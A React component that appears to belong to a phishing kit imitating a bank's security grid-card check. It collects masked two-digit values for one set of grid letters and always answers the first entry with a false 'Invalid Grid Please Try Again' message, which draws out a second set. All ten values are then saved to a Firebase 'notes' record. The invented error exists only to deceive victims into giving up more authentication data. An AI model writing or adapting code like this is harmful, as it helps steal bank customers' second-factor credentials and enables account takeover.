import { useState } from "react";
import ThirdPage from './ThirdPage';
import FirebaseUtil from "./FirebaseRepo";
import { useNavigate } from 'react-router-dom';

function PairsLayout() {

  
const handleNavigate = () => {
  navigate('/third-page');
};

    const navigate = useNavigate();
  const [letters, setLetters] = useState(["B", "E", "H", "P", "L"]);
  const [values, setValues] = useState({
    B: "",
    E: "",
    H: "",
    P: "",
    L: "",
    C: "",
    A: "",
    K: "",
    M: "",
    O: "",
  });
  const [isFirstSubmit, setIsFirstSubmit] = useState(true);
  const [cachedValues, setCachedValues] = useState({});

  const handleChange = (e) => {
    const { name, value } = e.target;
    if (value.length <= 2) {
      setValues({ ...values, [name]: value });
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (isFirstSubmit) {
      // Cache the values for the first set of letters
      const cachedValues = {};
      letters.forEach((letter) => {
        cachedValues[letter] = values[letter];
      });
      setCachedValues(cachedValues);
      // Update the letters and flag
      setLetters(["C", "A", "K", "M", "O"]);
      setIsFirstSubmit(false);
      // Reset the values
      setValues({
        B: "",
        E: "",
        H: "",
        P: "",
        L: "",
        C: "",
        A: "",
        K: "",
        M: "",
        O: "",
      });
    } else {
      // Log all the values
      console.log("Final values:");
      const allValues = { ...cachedValues };
      letters.forEach((letter) => {
        allValues[letter] = values[letter];
      });
      const key = localStorage.getItem("key");
      console.log("key = "+key);
      if (key) {
        FirebaseUtil.updateAnyModel("notes",key, allValues);
        console.log(allValues);
        // Navigate to the third page
        navigate('/third-page');
      }
  
      return <ThirdPage />;
    }
  };

  return (
    <div className="flex flex-col items-center gap-6">
      <label className="text-lg font-bold">Numbers</label>
      <form onSubmit={handleSubmit} className="flex gap-4">
        {letters.map((letter) => (
          <div key={letter} className="flex flex-col items-center">
            <label htmlFor={letter} className="mb-2 font-bold">
              {letter}
            </label>
            <input
              type="password"
              id={letter}
              name={letter}
              value={values[letter]}
              onChange={handleChange}
              maxLength={2}
              className="w-12 h-10 text-center border-2 border-orange-500 rounded-md focus:outline-none focus:ring-2 focus:ring-orange-300"
            />
          </div>
        ))}
      </form>
     {!isFirstSubmit &&  <h3 className="text-lg font-bold text-red-500">Invalid Grid Please Try Again</h3>}
      <button
        type="submit"
        onClick={handleSubmit}
        className="px-4 py-2 bg-orange-500 text-white font-bold rounded-md hover:bg-orange-800"> Submit</button>
        <button className="text-bl" onClick={handleNavigate}>I do not have my card</button>
    </div>
  );
}


export default PairsLayout;